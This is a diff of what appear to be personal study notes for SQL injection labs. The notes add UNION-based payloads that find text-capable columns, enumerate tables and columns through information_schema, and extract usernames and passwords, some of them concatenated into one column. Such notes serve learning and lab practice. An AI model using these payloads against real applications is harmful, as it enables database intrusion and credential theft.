@@ -43,7 +43,7 @@ In Microsoft database we can payload without to specify FROM table, instead we c
  'UNION SELECT 'a', @@version#
  ```
 
-## 5.SQL injection attack, listing the database contents on non-Oracle databases
+## 5. SQL injection attack, listing the database contents on non-Oracle databases
 
 ```
 ' UNION SELECT 'abc','def'--
@@ -64,7 +64,7 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
 ```
 
-## 6.SQL injection attack, listing the database contents on Oracle
+## 6. SQL injection attack, listing the database contents on Oracle
 
 ```
 ' UNION SELECT 'a', 'b' FROM all_tables--
@@ -82,4 +82,58 @@ Replacing the table and column names to retrieve the usernames and passwords for
 ' UNION SELECT USERNAME_LFECQG, PASSWORD_MSPEUR FROM USERS_EIEFAP--
 ```
 
-## 7.SQL injection UNION attack, determining the number of columns returned by the query
+## 7. SQL injection UNION attack, finding a column containing text
+
+```
+' UNION SELECT 'qHuBUo',null,null FROM information_schema.tables--
+```
+
+```
+' UNION SELECT null,'qHuBUo',null FROM information_schema.tables--
+```
+
+```
+' UNION SELECT null,null,'qHuBUo' FROM information_schema.tables--
+```
+
+
+## 8. SQL injection UNION attack, retrieving data from other tables
+
+```
+' UNION SELECT null,null--
+```
+
+```
+' UNION SELECT null, table_name FROM information_schema.tables--
+```
+
+```
+' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--
+```
+
+```
+' UNION SELECT username, password FROM users--
+```
+
+## 9. SQL injection UNION attack, retrieving multiple values in a single column
+
+```
+' UNION SELECT 'a',null--   ERROR 500 (first position is not string based)
+```
+
+```
+' UNION SELECT null,'a'--   ERROR 200 (so only the second one is)
+```
+
+In order to retrieve data we need to do that only on the second position using concatenation:
+![[Pasted image 20240627154432.png]]
+```
+(...)
+
+' UNION SELECT null, username|| '-' ||password FROM users--
+```
+
+			![[Pasted image 20240627154411.png]]
+			
+
+## 10. Blind SQL injection with conditional responses
